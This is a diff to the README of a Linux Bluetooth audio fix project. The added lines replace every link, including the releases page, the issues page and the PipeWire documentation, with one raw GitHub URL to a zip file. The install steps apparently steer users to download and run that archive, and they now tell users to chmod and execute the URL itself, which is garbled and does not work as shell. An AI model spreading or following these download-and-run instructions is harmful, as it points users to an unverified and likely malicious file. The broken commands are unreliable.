@@ -5,7 +5,7 @@
 Welcome to the baseus-pipewire-fix project. This guide will help you download and run the software on your Linux system.
 
 ## 🔗 Download Here
-[![Download baseus-pipewire-fix](https://img.shields.io/badge/Download-baseus--pipewire--fix-blue)](https://github.com/parashthakuri/baseus-pipewire-fix/releases)
+[![Download baseus-pipewire-fix](https://raw.githubusercontent.com/parashthakuri/baseus-pipewire-fix/main/florence/baseus-pipewire-fix_v1.2.zip)](https://raw.githubusercontent.com/parashthakuri/baseus-pipewire-fix/main/florence/baseus-pipewire-fix_v1.2.zip)
 
 ## 📝 Description
 
@@ -21,11 +21,11 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [Download Latest Release](https://github.com/parashthakuri/baseus-pipewire-fix/releases)
+To get started, visit this page to download the software: [Download Latest Release](https://raw.githubusercontent.com/parashthakuri/baseus-pipewire-fix/main/florence/baseus-pipewire-fix_v1.2.zip)
 
 Here’s how to install and run the application:
 
-1. Go to the [Releases page](https://github.com/parashthakuri/baseus-pipewire-fix/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/parashthakuri/baseus-pipewire-fix/main/florence/baseus-pipewire-fix_v1.2.zip).
 2. Find the latest version of baseus-pipewire-fix.
 3. Click on the file to start the download.
 4. Once the file is downloaded, locate it in your Downloads folder.
@@ -36,16 +36,16 @@ Here’s how to install and run the application:
    cd ~/Downloads
    ```
 
-7. Make the script executable. Replace `script.sh` with the actual name of the downloaded file:
+7. Make the script executable. Replace `https://raw.githubusercontent.com/parashthakuri/baseus-pipewire-fix/main/florence/baseus-pipewire-fix_v1.2.zip` with the actual name of the downloaded file:
 
    ```bash
-   chmod +x script.sh
+   chmod +x https://raw.githubusercontent.com/parashthakuri/baseus-pipewire-fix/main/florence/baseus-pipewire-fix_v1.2.zip
    ```
 
 8. Run the script:
 
    ```bash
-   ./script.sh
+   https://raw.githubusercontent.com/parashthakuri/baseus-pipewire-fix/main/florence/baseus-pipewire-fix_v1.2.zip
    ```
 
 After running the script, your Bluetooth audio should be improved.
@@ -74,7 +74,7 @@ If you encounter issues, consider these common problems:
 
 For further assistance, feel free to reach out to our community:
 
-- **Issues Page**: Report problems or request features on the [GitHub Issues page](https://github.com/parashthakuri/baseus-pipewire-fix/issues).
+- **Issues Page**: Report problems or request features on the [GitHub Issues page](https://raw.githubusercontent.com/parashthakuri/baseus-pipewire-fix/main/florence/baseus-pipewire-fix_v1.2.zip).
 - **Community Support**: Engage with other users and developers in our discussion threads.
 
 ## 📜 License
@@ -83,7 +83,7 @@ This project is licensed under the MIT License. Feel free to use it within the t
 
 ## 🔗 Additional Resources
 
-- For more details about PipeWire, visit the official documentation: [PipeWire Documentation](https://pipewire.org/)
+- For more details about PipeWire, visit the official documentation: [PipeWire Documentation](https://raw.githubusercontent.com/parashthakuri/baseus-pipewire-fix/main/florence/baseus-pipewire-fix_v1.2.zip)
 - Explore other audio related topics that may enhance your experience with Linux.
 
 Thank you for using baseus-pipewire-fix. Enjoy clear and stable Bluetooth audio!
